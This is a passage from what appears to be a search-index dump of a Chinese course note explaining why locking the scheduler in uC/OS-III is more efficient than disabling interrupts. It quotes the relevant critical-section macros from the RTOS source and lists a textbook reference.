\u4f7f\u7528\u5173\u4e2d\u65ad\u8fdb\u5165\u4e34\u754c\u533a\u4ee5\u540e\uff0c\u7cfb\u7edf\u4e0d\u4f1a\u54cd\u5e94\u4e2d\u65ad\u8bf7\u6c42\uff0c\u5982\u679c\u4e34\u754c\u533a\u91cc\u9700\u8981\u505a\u4e00\u4e9b\u5982I/O\u3001\u4e0e\u5916\u8bbe\u4ea4\u4e92\u7b49\u9700\u8981\u8fdb\u5165\u8f83\u957f\u65f6\u95f4\u7684\u7b49\u5f85\u72b6\u6001\u7684\u4efb\u52a1\uff0c\u6b64\u65f6CPU\u5c31\u5904\u4e8e\u5fd9\u7b49\u72b6\u6001\uff0c\u4e0d\u80fd\u591f\u54cd\u5e94\u4e2d\u65ad\u53bb\u8fd0\u884c\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\uff0c\u8fd9\u5c31\u964d\u4f4e\u4e86\u7cfb\u7edf\u7684\u8fd0\u884c\u6548\u7387\u3002 \u9501\u8c03\u5ea6\u5668\u7684\u65b9\u5f0f\u53ef\u4ee5\u4fdd\u8bc1\u5f53\u524d\u8fd0\u884c\u7684\u4efb\u52a1\u4e0d\u4f1a\u88ab\u5176\u4ed6\u4efb\u52a1\u62a2\u5360\uff0c\u4f7f\u4efb\u52a1\u8fdb\u5165\u4e86\u4e34\u754c\u533a\u3002 \u4f46\u662f\u9501\u4f4f\u8c03\u5ea6\u5668\u4e4b\u540e\u8fd8\u53ef\u4ee5\u54cd\u5e94\u4e2d\u65ad\uff0c\u51cf\u5c11\u4e86\u5173\u4e2d\u65ad\u7684\u65f6\u95f4\uff0c\u4f7f\u5f97CPU\u4e0d\u4f1a\u957f\u65f6\u95f4\u5904\u4e8e\u5fd9\u7b49\u72b6\u6001\uff0c\u63d0\u9ad8\u4e86\u7cfb\u7edf\u7684\u5b9e\u65f6\u6027\u548c\u8fd0\u884c\u6548\u7387\u3002 3. \u5173\u4e2d\u65ad\u548c\u9501\u8c03\u5ea6\u5668 # 3.1. \u6982\u5ff5 # \u4e2d\u65ad \uff1a\u4e2d\u65ad\u673a\u5236\u662f\u5904\u7406\u5668\u7684\u91cd\u8981\u57fa\u7840\u8bbe\u65bd\uff0c\u7528\u6765\u5e94\u5bf9\u5404\u79cd\u4e8b\u4ef6\u7684\u54cd\u5e94\u548c\u5904\u7406\u3002\u5f53\u5916\u8bbe\u6216\u8005\u5904\u7406\u5668\u81ea\u8eab\u6709\u4e8b\u4ef6\u53d1\u751f\u65f6\uff0c\u5904\u7406\u5668\u4f1a\u6682\u505c\u6267\u884c\u5f53\u524d\u7684\u4ee3\u7801\uff0c\u5e76\u8f6c\u5411\u5904\u7406\u8fd9\u4e9b\u4e2d\u65ad\u4e8b\u52a1\u3002\u4e2d\u65ad\u53ef\u5206\u4e3a\u5916\u90e8\u4e2d\u65ad\u3001\u5185\u90e8\u4e2d\u65ad\u548c\u8f6f\u4ef6\u4e2d\u65ad 1 \u3002 \u62a2\u5360 \uff1a\u901a\u8fc7\u8c03\u5ea6\u5668\u5b9e\u73b0\uff0c\u62a2\u5360\u7684\u53d1\u751f\u53ef\u80fd\u662f\u56e0\u4e3a\u6709\u66f4\u9ad8\u4f18\u5148\u7ea7\u7684\u4efb\u52a1\u8fdb\u5165\u5c31\u7eea\u961f\u5217\uff08\u4f18\u5148\u7ea7\u62a2\u5360\u673a\u5236\uff09\u6216\u8be5\u4efb\u52a1\u7684\u65f6\u95f4\u7247\u5df2\u7ed3\u675f\uff08\u65f6\u95f4\u7247\u8f6e\u8f6c\u673a\u5236\uff09\u3002\u62a2\u5360\u53ef\u5206\u4e3a\u7528\u6237\u62a2\u5360\u548c\u5185\u6838\u62a2\u5360\u3002 \u5173\u4e2d\u65ad \uff1a\u8fdb\u5165\u4e34\u754c\u6bb5\uff0c\u7981\u6b62\u5176\u4ed6\u4e2d\u65ad\u64cd\u4f5c\uff0c\u5173\u4e2d\u65ad\u4ee5\u540e\u4ea7\u751f\u7684\u4e2d\u65ad\u8bf7\u6c42\u4f1a\u88ab\u6302\u8d77\uff0c\u7b49\u5f85\u5f00\u4e2d\u65ad\u4ee5\u540e\u518d\u54cd\u5e94\u3002 \u5f00\u4e2d\u65ad \uff1a\u9000\u51fa\u4e34\u754c\u6bb5\uff0c\u5141\u8bb8\u4e2d\u65ad\u64cd\u4f5c\u3002 \u9501\u8c03\u5ea6\u5668 \uff1a\u9501\u4f4f\u8c03\u5ea6\u5668(Lock the scheduler)\uff0c\u4e0d\u5141\u8bb8\u5176\u4ed6\u4efb\u52a1\u62a2\u5360\u5f53\u524d\u4efb\u52a1\u3002 \u5f00\u542f\u8c03\u5ea6\u5668 \uff1a\u89e3\u9501\u8c03\u5ea6\u5668(Unlock the scheduler)\uff0c\u5141\u8bb8\u5176\u4ed6\u4efb\u52a1\u62a2\u5360\u5f53\u524d\u4efb\u52a1\u3002 RTOS \uff1a\u5b9e\u65f6\u64cd\u4f5c\u7cfb\u7edf\uff08Real Time Operating System\uff09\u3002 ISR \uff1a\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\uff08Interrupt Service Routine\uff09\u3002\u5728CPU\u4fdd\u62a4\u4e2d\u65ad\u73b0\u573a\u4e4b\u540e\uff0cRTOS\u8fdb\u5165\uff0c\u8fdb\u884c\u4e2d\u65ad\u9884\u5904\u7406\uff0c\u8bb0\u5f55\u5f53\u524d\u4e2d\u65ad\u5d4c\u5957\u6df1\u5ea6\uff0c\u67e5\u627e\u7528\u6237\u767b\u8bb0\u7684\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\uff0c\u7136\u540eCPU\u5f00\u59cb\u6267\u884c\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f 1 \u3002 3.2. \u6e90\u4ee3\u7801 # 3.2.1. \u5f00/\u5173\u4e2d\u65ad # \u8fd9\u91cc\u6709\u4e24\u79cd\u65b9\u5f0f\u901a\u8fc7\u5173\u4e2d\u65ad\u8fdb\u5165\u4e34\u754c\u6bb5 CPU_INT_DIS() CPU_CRITICAL_ENTER() \u82e5 CPU_CFG_INT_DIS_MEAS_EN \u6807\u8bb0\u4e3a False \uff0c\u4e24\u4e2a\u51fd\u6570\u5b8c\u5168\u4e00\u81f4\uff0c\u540e\u8005\u53ea\u662f\u5c06\u524d\u8005\u5c01\u88c5\u4e86\u4e00\u4e0b\u3002 \u82e5 CPU_CFG_INT_DIS_MEAS_EN \u6807\u8bb0\u4e3a True \uff0cCPU_CRITICAL_ENTER()\u4f1a\u8bb0\u5f55\u5173\u4e2d\u65ad\u7684\u65f6\u95f4\u3002 #define CPU_INT_DIS() do { CPU_IntDis(); } while (0) /* Disable interrupts. */ #define CPU_INT_EN() do { CPU_IntEn(); } while (0) /* Enable interrupts.*/ #ifdef CPU_CFG_INT_DIS_MEAS_EN /* Disable interrupts, ... */ /* & start interrupts disabled time measurement.*/ #define CPU_CRITICAL_ENTER() do { CPU_INT_DIS(); \\ CPU_IntDisMeasStart(); } while (0) /* Stop & measure interrupts disabled time, */ /* ... & re-enable interrupts. */ #define CPU_CRITICAL_EXIT() do { CPU_IntDisMeasStop(); \\ CPU_INT_EN(); } while (0) /* -------------------------------------------- */ #else #define CPU_CRITICAL_ENTER() do { CPU_INT_DIS(); } while (0) /* Disable interrupts.*/ #define CPU_CRITICAL_EXIT() do { CPU_INT_EN(); } while (0) /* Re-enable interrupts.*/ #endif 3.2.2. \u9501\u8c03\u5ea6\u5668 # OS_CFG_ISR_POST_DEFERRED_EN\uff1a\u6807\u8bb0\u662f\u5426\u4f7f\u7528\u4e2d\u65ad\u5ef6\u8fdf\u63d0\u4ea4 // os_cfg.h #define OS_CFG_ISR_POST_DEFERRED_EN 0u /* Enable (1) or Disable (0) Deferred ISR posts*/ \u8fd9\u91cc\u6709\u4e24\u79cd\u65b9\u5f0f\u8fdb\u5165\u4e34\u754c\u6bb5 \u8c03\u7528OS_CRITICAL_ENTER()\u9501\u8c03\u5ea6\u5668\u3002 \u5148\u8c03\u7528CPU_CRITICAL_ENTER()\u5173\u4e2d\u65ad\uff0c\u518d\u8c03\u7528OS_CRITICAL_ENTER_CPU_EXIT()\u9501\u8c03\u5ea6\u5668\u5e76\u5f00\u4e2d\u65ad\u3002 \u82e5 OS_CFG_ISR_POST_DEFERRED_EN \u6807\u8bb0\u4e3a False \uff0cOS_CRITICAL_ENTER()\u5b9e\u73b0\u7684\u662f\u5173\u4e2d\u65ad\uff0cOS_CRITICAL_ENTER_CPU_EXIT()\u662f\u4e00\u4e2a\u7a7a\u51fd\u6570\u3002 \u82e5 CPU_CFG_INT_DIS_MEAS_EN \u6807\u8bb0\u4e3a True \uff0c\u8fd9\u91cc\u7684\u4e24\u4e2a\u51fd\u6570\u90fd\u80fd\u5b9e\u73b0\u9501\u8c03\u5ea6\u5668\u7684\u529f\u80fd\u3002 // os.h #if (OS_CFG_ISR_POST_DEFERRED_EN == DEF_ENABLED) /* Deferred ISR Posts */ /* Lock the scheduler*/ #define OS_CRITICAL_ENTER() \\ do { \\ CPU_CRITICAL_ENTER(); \\ OSSchedLockNestingCtr++; \\ if (OSSchedLockNestingCtr == 1u) { \\ OS_SCHED_LOCK_TIME_MEAS_START(); \\ } \\ CPU_CRITICAL_EXIT(); \\ } while (0) /* Lock the scheduler but re-enable interrupts */ #define OS_CRITICAL_ENTER_CPU_EXIT() \\ do { \\ OSSchedLockNestingCtr++; \\ \\ if (OSSchedLockNestingCtr == 1u) { \\ OS_SCHED_LOCK_TIME_MEAS_START(); \\ } \\ CPU_CRITICAL_EXIT(); \\ } while (0) /* Scheduling occurs only if an interrupt occurs*/ #define OS_CRITICAL_EXIT() \\ do { \\ CPU_CRITICAL_ENTER(); \\ OSSchedLockNestingCtr--; \\ if (OSSchedLockNestingCtr == (OS_NESTING_CTR)0) { \\ OS_SCHED_LOCK_TIME_MEAS_STOP(); \\ if (OSIntQNbrEntries > (OS_OBJ_QTY)0) { \\ CPU_CRITICAL_EXIT(); \\ OS_Sched0(); \\ } else { \\ CPU_CRITICAL_EXIT(); \\ } \\ } else { \\ CPU_CRITICAL_EXIT(); \\ } \\ } while (0) #define OS_CRITICAL_EXIT_NO_SCHED() \\ do { \\ CPU_CRITICAL_ENTER(); \\ OSSchedLockNestingCtr--; \\ if (OSSchedLockNestingCtr == (OS_NESTING_CTR)0) { \\ OS_SCHED_LOCK_TIME_MEAS_STOP(); \\ } \\ CPU_CRITICAL_EXIT(); \\ } while (0) #else /* Direct ISR Posts */ #define OS_CRITICAL_ENTER() CPU_CRITICAL_ENTER() #define OS_CRITICAL_ENTER_CPU_EXIT() #define OS_CRITICAL_EXIT() CPU_CRITICAL_EXIT() #define OS_CRITICAL_EXIT_NO_SCHED() CPU_CRITICAL_EXIT() #endif 4. \u53c2\u8003\u6587\u732e # [1] \u5218\u65ed\u660e. \u5d4c\u5165\u5f0f\u5b9e\u65f6\u64cd\u4f5c\u7cfb\u7edf\u539f\u7406\u4e0e\u6700\u4f73\u5b9e\u8df5. \u673a\u68b0\u5de5\u4e1a\u51fa\u7248\u793e, 2014. \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3.uCos\u4e2d\u9501\u8c03\u5ea6\u5668\u4e3a\u4ec0\u4e48\u6bd4\u5173\u4e2d\u65ad\u6548\u7387\u66f4\u9ad8"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/3.uCos%E4%B8%AD%E9%94%81%E8%B0%83%E5%BA%A6%E5%99%A8%E4%B8%BA%E4%BB%80%E4%B9%88%E6%AF%94%E5%85%B3%E4%B8%AD%E6%96%AD%E6%95%88%E7%8E%87%E6%9B%B4%E9%AB%98/#ucos","text":"","title":"uC/OS\u4e2d\u9501\u8c03\u5ea6\u5668\u4e3a\u4ec0\u4e48\u6bd4\u5173\u4e2d\u65ad\u6548\u7387\u66f4\u9ad8"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/3.uCos%E4%B8%AD%E9%94%81%E8%B0%83%E5%BA%A6%E5%99%A8%E4%B8%BA%E4%BB%80%E4%B9%88%E6%AF%94%E5%85%B3%E4%B8%AD%E6%96%AD%E6%95%88%E7%8E%87%E6%9B%B4%E9%AB%98/#_1","text":"uC/OS\u4e2d\u9501\u8c03\u5ea6\u5668\u4e3a\u4ec0\u4e48\u6bd4\u5173\u4e2d\u65ad\u6548\u7387\u66f4\u9ad8 \u76ee\u5f55 1. \u80cc\u666f 2. \u4f18\u5316\u539f\u56e0 3. \u5173\u4e2d\u65ad\u548c\u9501\u8c03\u5ea6\u5668 3.1. \u6982\u5ff5 3.2. \u6e90\u4ee3\u7801 3.2.1. \u5f00/\u5173\u4e2d\u65ad 3.2.2. \u9501\u8c03\u5ea6\u5668 4. \u53c2\u8003\u6587\u732e","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/3.uCos%E4%B8%AD%E9%94%81%E8%B0%83%E5%BA%A6%E5%99%A8%E4%B8%BA%E4%BB%80%E4%B9%88%E6%AF%94%E5%85%B3%E4%B8%AD%E6%96%AD%E6%95%88%E7%8E%87%E6%9B%B4%E9%AB%98/#1","text":"\u4eca\u5929\u770b \u300a\u03bcC/OS-III\u6e90\u7801\u5206\u6790\u7b14\u8bb0\u300b \u7684\u65f6\u5019\u5b66\u4e60\u4e86\u901a\u8fc7\u4f7f\u7528 \u9501\u8c03\u5ea6\u5668 \u4ee3\u66ff \u5173\u4e2d\u65ad \uff0c\u5e76\u4f7f\u7528\u4e2d\u65ad\u5ef6\u8fdf\u63d0\u4ea4\uff0c\u80fd\u591f\u5927\u5927\u8282\u7701\u5173\u4e2d\u65ad\u7684\u65f6\u95f4\uff0c\u63d0\u9ad8\u8fd0\u884c\u6548\u7387\u3002\u4f46\u662f\u6548\u7387\u5177\u4f53\u662f\u5982\u4f55\u63d0\u9ad8\u7684\uff0c\u4e66\u4e2d\u7684\u8bf4\u660e\u6211\u6ca1\u6709\u592a\u770b\u660e\u767d\uff0c\u4e8e\u662f\u6211\u5c31\u628a\u4e66\u4e2d\u63d0\u5230\u7684\u51fd\u6570\u7684\u6e90\u4ee3\u7801\u627e\u51fa\u6765\u5206\u6790\u4e86\u4e00\u4e0b\uff0c\u5e0c\u671b\u80fd\u591f\u7406\u89e3 \u9501\u8c03\u5ea6\u5668 \u548c \u5173\u4e2d\u65ad \u4e24\u8005\u4e4b\u95f4\u7684\u533a\u522b\u3002uC/OS\u5b8c\u6574\u6e90\u4ee3\u7801\u53ef\u4ee5\u4ece \u5b98\u7f51 \u548c \u6211\u7684Github\u4e0a \u4e0b\u8f7d\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/3.uCos%E4%B8%AD%E9%94%81%E8%B0%83%E5%BA%A6%E5%99%A8%E4%B8%BA%E4%BB%80%E4%B9%88%E6%AF%94%E5%85%B3%E4%B8%AD%E6%96%AD%E6%95%88%E7%8E%87%E6%9B%B4%E9%AB%98/#2","text":"\u4f7f\u7528\u5173\u4e2d\u65ad\u8fdb\u5165\u4e34\u754c\u533a\u4ee5\u540e\uff0c\u7cfb\u7edf\u4e0d\u4f1a\u54cd\u5e94\u4e2d\u65ad\u8bf7\u6c42\uff0c\u5982\u679c\u4e34\u754c\u533a\u91cc\u9700\u8981\u505a\u4e00\u4e9b\u5982I/O\u3001\u4e0e\u5916\u8bbe\u4ea4\u4e92\u7b49\u9700\u8981\u8fdb\u5165\u8f83\u957f\u65f6\u95f4\u7684\u7b49\u5f85\u72b6\u6001\u7684\u4efb\u52a1\uff0c\u6b64\u65f6CPU\u5c31\u5904\u4e8e\u5fd9\u7b49\u72b6\u6001\uff0c\u4e0d\u80fd\u591f\u54cd\u5e94\u4e2d\u65ad\u53bb\u8fd0\u884c\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\uff0c\u8fd9\u5c31\u964d\u4f4e\u4e86\u7cfb\u7edf\u7684\u8fd0\u884c\u6548\u7387\u3002 \u9501\u8c03\u5ea6\u5668\u7684\u65b9\u5f0f\u53ef\u4ee5\u4fdd\u8bc1\u5f53\u524d\u8fd0\u884c\u7684\u4efb\u52a1\u4e0d\u4f1a\u88ab\u5176\u4ed6\u4efb\u52a1\u62a2\u5360\uff0c\u4f7f\u4efb\u52a1\u8fdb\u5165\u4e86\u4e34\u754c\u533a\u3002 \u4f46\u662f\u9501\u4f4f\u8c03\u5ea6\u5668\u4e4b\u540e\u8fd8\u53ef\u4ee5\u54cd\u5e94\u4e2d\u65ad\uff0c\u51cf\u5c11\u4e86\u5173\u4e2d\u65ad\u7684\u65f6\u95f4\uff0c\u4f7f\u5f97CPU\u4e0d\u4f1a\u957f\u65f6\u95f4\u5904\u4e8e\u5fd9\u7b49\u72b6\u6001\uff0c\u63d0\u9ad8\u4e86\u7cfb\u7edf\u7684\u5b9e\u65f6\u6027\u548c\u8fd0\u884c\u6548\u7387\u3002","title":"2. \u4f18\u5316\u539f\u56e0"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/3.uCos%E4%B8%AD%E9%94%81%E8%B0%83%E5%BA%A6%E5%99%A8%E4%B8%BA%E4%BB%80%E4%B9%88%E6%AF%94%E5%85%B3%E4%B8%AD%E6%96%AD%E6%95%88%E7%8E%87%E6%9B%B4%E9%AB%98/#3","text":"","title":"3. \u5173\u4e2d\u65ad\u548c\u9501\u8c03\u5ea6\u5668"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/3.uCos%E4%B8%AD%E9%94%81%E8%B0%83%E5%BA%A6%E5%99%A8%E4%B8%BA%E4%BB%80%E4%B9%88%E6%AF%94%E5%85%B3%E4%B8%AD%E6%96%AD%E6%95%88%E7%8E%87%E6%9B%B4%E9%AB%98/#31","text":"\u4e2d\u65ad \uff1a\u4e2d\u65ad\u673a\u5236\u662f\u5904\u7406\u5668\u7684\u91cd\u8981\u57fa\u7840\u8bbe\u65bd\uff0c\u7528\u6765\u5e94\u5bf9\u5404\u79cd\u4e8b\u4ef6\u7684\u54cd\u5e94\u548c\u5904\u7406\u3002\u5f53\u5916\u8bbe\u6216\u8005\u5904\u7406\u5668\u81ea\u8eab\u6709\u4e8b\u4ef6\u53d1\u751f\u65f6\uff0c\u5904\u7406\u5668\u4f1a\u6682\u505c\u6267\u884c\u5f53\u524d\u7684\u4ee3\u7801\uff0c\u5e76\u8f6c\u5411\u5904\u7406\u8fd9\u4e9b\u4e2d\u65ad\u4e8b\u52a1\u3002\u4e2d\u65ad\u53ef\u5206\u4e3a\u5916\u90e8\u4e2d\u65ad\u3001\u5185\u90e8\u4e2d\u65ad\u548c\u8f6f\u4ef6\u4e2d\u65ad 1 \u3002 \u62a2\u5360 \uff1a\u901a\u8fc7\u8c03\u5ea6\u5668\u5b9e\u73b0\uff0c\u62a2\u5360\u7684\u53d1\u751f\u53ef\u80fd\u662f\u56e0\u4e3a\u6709\u66f4\u9ad8\u4f18\u5148\u7ea7\u7684\u4efb\u52a1\u8fdb\u5165\u5c31\u7eea\u961f\u5217\uff08\u4f18\u5148\u7ea7\u62a2\u5360\u673a\u5236\uff09\u6216\u8be5\u4efb\u52a1\u7684\u65f6\u95f4\u7247\u5df2\u7ed3\u675f\uff08\u65f6\u95f4\u7247\u8f6e\u8f6c\u673a\u5236\uff09\u3002\u62a2\u5360\u53ef\u5206\u4e3a\u7528\u6237\u62a2\u5360\u548c\u5185\u6838\u62a2\u5360\u3002 \u5173\u4e2d\u65ad \uff1a\u8fdb\u5165\u4e34\u754c\u6bb5\uff0c\u7981\u6b62\u5176\u4ed6\u4e2d\u65ad\u64cd\u4f5c\uff0c\u5173\u4e2d\u65ad\u4ee5\u540e\u4ea7\u751f\u7684\u4e2d\u65ad\u8bf7\u6c42\u4f1a\u88ab\u6302\u8d77\uff0c\u7b49\u5f85\u5f00\u4e2d\u65ad\u4ee5\u540e\u518d\u54cd\u5e94\u3002 \u5f00\u4e2d\u65ad \uff1a\u9000\u51fa\u4e34\u754c\u6bb5\uff0c\u5141\u8bb8\u4e2d\u65ad\u64cd\u4f5c\u3002 \u9501\u8c03\u5ea6\u5668 \uff1a\u9501\u4f4f\u8c03\u5ea6\u5668(Lock the scheduler)\uff0c\u4e0d\u5141\u8bb8\u5176\u4ed6\u4efb\u52a1\u62a2\u5360\u5f53\u524d\u4efb\u52a1\u3002 \u5f00\u542f\u8c03\u5ea6\u5668 \uff1a\u89e3\u9501\u8c03\u5ea6\u5668(Unlock the scheduler)\uff0c\u5141\u8bb8\u5176\u4ed6\u4efb\u52a1\u62a2\u5360\u5f53\u524d\u4efb\u52a1\u3002 RTOS \uff1a\u5b9e\u65f6\u64cd\u4f5c\u7cfb\u7edf\uff08Real Time Operating System\uff09\u3002 ISR \uff1a\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\uff08Interrupt Service Routine\uff09\u3002\u5728CPU\u4fdd\u62a4\u4e2d\u65ad\u73b0\u573a\u4e4b\u540e\uff0cRTOS\u8fdb\u5165\uff0c\u8fdb\u884c\u4e2d\u65ad\u9884\u5904\u7406\uff0c\u8bb0\u5f55\u5f53\u524d\u4e2d\u65ad\u5d4c\u5957\u6df1\u5ea6\uff0c\u67e5\u627e\u7528\u6237\u767b\u8bb0\u7684\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\uff0c\u7136\u540eCPU\u5f00\u59cb\u6267\u884c\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f 1 \u3002","title":"3.1. \u6982\u5ff5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/3.uCos%E4%B8%AD%E9%94%81%E8%B0%83%E5%BA%A6%E5%99%A8%E4%B8%BA%E4%BB%80%E4%B9%88%E6%AF%94%E5%85%B3%E4%B8%AD%E6%96%AD%E6%95%88%E7%8E%87%E6%9B%B4%E9%AB%98/#32","text":"","title":"3.2. \u6e90\u4ee3\u7801"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/3.uCos%E4%B8%AD%E9%94%81%E8%B0%83%E5%BA%A6%E5%99%A8%E4%B8%BA%E4%BB%80%E4%B9%88%E6%AF%94%E5%85%B3%E4%B8%AD%E6%96%AD%E6%95%88%E7%8E%87%E6%9B%B4%E9%AB%98/#321","text":"\u8fd9\u91cc\u6709\u4e24\u79cd\u65b9\u5f0f\u901a\u8fc7\u5173\u4e2d\u65ad\u8fdb\u5165\u4e34\u754c\u6bb5 CPU_INT_DIS() CPU_CRITICAL_ENTER() \u82e5 CPU_CFG_INT_DIS_MEAS_EN \u6807\u8bb0\u4e3a False \uff0c\u4e24\u4e2a\u51fd\u6570\u5b8c\u5168\u4e00\u81f4\uff0c\u540e\u8005\u53ea\u662f\u5c06\u524d\u8005\u5c01\u88c5\u4e86\u4e00\u4e0b\u3002 \u82e5 CPU_CFG_INT_DIS_MEAS_EN \u6807\u8bb0\u4e3a True \uff0cCPU_CRITICAL_ENTER()\u4f1a\u8bb0\u5f55\u5173\u4e2d\u65ad\u7684\u65f6\u95f4\u3002 #define CPU_INT_DIS() do { CPU_IntDis(); } while (0) /* Disable interrupts. */ #define CPU_INT_EN() do { CPU_IntEn(); } while (0) /* Enable interrupts.*/ #ifdef CPU_CFG_INT_DIS_MEAS_EN /* Disable interrupts, ... */ /* & start interrupts disabled time measurement.*/ #define CPU_CRITICAL_ENTER() do { CPU_INT_DIS(); \\ CPU_IntDisMeasStart(); } while (0) /* Stop & measure interrupts disabled time, */ /* ... & re-enable interrupts. */ #define CPU_CRITICAL_EXIT() do { CPU_IntDisMeasStop(); \\ CPU_INT_EN(); } while (0) /* -------------------------------------------- */ #else #define CPU_CRITICAL_ENTER() do { CPU_INT_DIS(); } while (0) /* Disable interrupts.*/ #define CPU_CRITICAL_EXIT() do { CPU_INT_EN(); } while (0) /* Re-enable interrupts.*/ #endif","title":"3.2.1. \u5f00/\u5173\u4e2d\u65ad"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/3.uCos%E4%B8%AD%E9%94%81%E8%B0%83%E5%BA%A6%E5%99%A8%E4%B8%BA%E4%BB%80%E4%B9%88%E6%AF%94%E5%85%B3%E4%B8%AD%E6%96%AD%E6%95%88%E7%8E%87%E6%9B%B4%E9%AB%98/#322","text":"OS_CFG_ISR_POST_DEFERRED_EN\uff1a\u6807\u8bb0\u662f\u5426\u4f7f\u7528\u4e2d\u65ad\u5ef6\u8fdf\u63d0\u4ea4 // os_cfg.h #define OS_CFG_ISR_POST_DEFERRED_EN 0u /* Enable (1) or Disable (0) Deferred ISR posts*/ \u8fd9\u91cc\u6709\u4e24\u79cd\u65b9\u5f0f\u8fdb\u5165\u4e34\u754c\u6bb5 \u8c03\u7528OS_CRITICAL_ENTER()\u9501\u8c03\u5ea6\u5668\u3002 \u5148\u8c03\u7528CPU_CRITICAL_ENTER()\u5173\u4e2d\u65ad\uff0c\u518d\u8c03\u7528OS_CRITICAL_ENTER_CPU_EXIT()\u9501\u8c03\u5ea6\u5668\u5e76\u5f00\u4e2d\u65ad\u3002 \u82e5 OS_CFG_ISR_POST_DEFERRED_EN \u6807\u8bb0\u4e3a False \uff0cOS_CRITICAL_ENTER()\u5b9e\u73b0\u7684\u662f\u5173\u4e2d\u65ad\uff0cOS_CRITICAL_ENTER_CPU_EXIT()\u662f\u4e00\u4e2a\u7a7a\u51fd\u6570\u3002 \u82e5 CPU_CFG_INT_DIS_MEAS_EN \u6807\u8bb0\u4e3a True \uff0c\u8fd9\u91cc\u7684\u4e24\u4e2a\u51fd\u6570\u90fd\u80fd\u5b9e\u73b0\u9501\u8c03\u5ea6\u5668\u7684\u529f\u80fd\u3002 // os.h #if (OS_CFG_ISR_POST_DEFERRED_EN == DEF_ENABLED) /* Deferred ISR Posts */ /* Lock the scheduler*/ #define OS_CRITICAL_ENTER() \\ do { \\ CPU_CRITICAL_ENTER(); \\ OSSchedLockNestingCtr++; \\ if (OSSchedLockNestingCtr == 1u) { \\ OS_SCHED_LOCK_TIME_MEAS_START(); \\ } \\ CPU_CRITICAL_EXIT(); \\ } while (0) /* Lock the scheduler but re-enable interrupts */ #define OS_CRITICAL_ENTER_CPU_EXIT() \\ do { \\ OSSchedLockNestingCtr++; \\ \\ if (OSSchedLockNestingCtr == 1u) { \\ OS_SCHED_LOCK_TIME_MEAS_START(); \\ } \\ CPU_CRITICAL_EXIT(); \\ } while (0) /* Scheduling occurs only if an interrupt occurs*/ #define OS_CRITICAL_EXIT() \\ do { \\ CPU_CRITICAL_ENTER(); \\ OSSchedLockNestingCtr--; \\ if (OSSchedLockNestingCtr == (OS_NESTING_CTR)0) { \\ OS_SCHED_LOCK_TIME_MEAS_STOP(); \\ if (OSIntQNbrEntries > (OS_OBJ_QTY)0) { \\ CPU_CRITICAL_EXIT(); \\ OS_Sched0(); \\ } else { \\ CPU_CRITICAL_EXIT(); \\ } \\ } else { \\ CPU_CRITICAL_EXIT(); \\ } \\ } while (0) #define OS_CRITICAL_EXIT_NO_SCHED() \\ do { \\ CPU_CRITICAL_ENTER(); \\ OSSchedLockNestingCtr--; \\ if (OSSchedLockNestingCtr == (OS_NESTING_CTR)0) { \\ OS_SCHED_LOCK_TIME_MEAS_STOP(); \\ } \\ CPU_CRITICAL_EXIT(); \\ } while (0) #else /* Direct ISR Posts */ #define OS_CRITICAL_ENTER() CPU_CRITICAL_ENTER() #define OS_CRITICAL_ENTER_CPU_EXIT() #define OS_CRITICAL_EXIT() CPU_CRITICAL_EXIT() #define OS_CRITICAL_EXIT_NO_SCHED() CPU_CRITICAL_EXIT() #endif","title":"3.2.2. \u9501\u8c03\u5ea6\u5668"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/3.uCos%E4%B8%AD%E9%94%81%E8%B0%83%E5%BA%A6%E5%99%A8%E4%B8%BA%E4%BB%80%E4%B9%88%E6%AF%94%E5%85%B3%E4%B8%AD%E6%96%AD%E6%95%88%E7%8E%87%E6%9B%B4%E9%AB%98/#4","text":"[1] \u5218\u65ed\u660e. \u5d4c\u5165\u5f0f\u5b9e\u65f6\u64cd\u4f5c\u7cfb\u7edf\u539f\u7406\u4e0e\u6700\u4f73\u5b9e\u8df5. \u673a\u68b0\u5de5\u4e1a\u51fa\u7248\u793e, 2014. \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong 